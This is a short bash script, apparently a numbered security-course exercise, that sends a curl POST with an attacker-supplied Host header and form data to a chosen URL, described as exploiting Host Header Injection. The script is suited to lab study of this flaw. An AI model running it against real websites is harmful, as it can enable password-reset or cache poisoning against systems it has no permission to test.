#!/usr/bin/env bash
# Exploit Host Header Injection using curl.
# Usage: ./1-host_header_injection.sh <NEW_HOST> <TARGET_URL> <FORM_DATA>

new_host="$1"
target_url="$2"
form_data="$3"

if [ -z "$new_host" ] || [ -z "$target_url" ] || [ -z "$form_data" ]; then
  echo "Usage: $0 <NEW_HOST> <TARGET_URL> <FORM_DATA>" >&2
  exit 1
fi

curl -sS -X POST \
  -H "Host: $new_host" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "$form_data" \
  "$target_url"
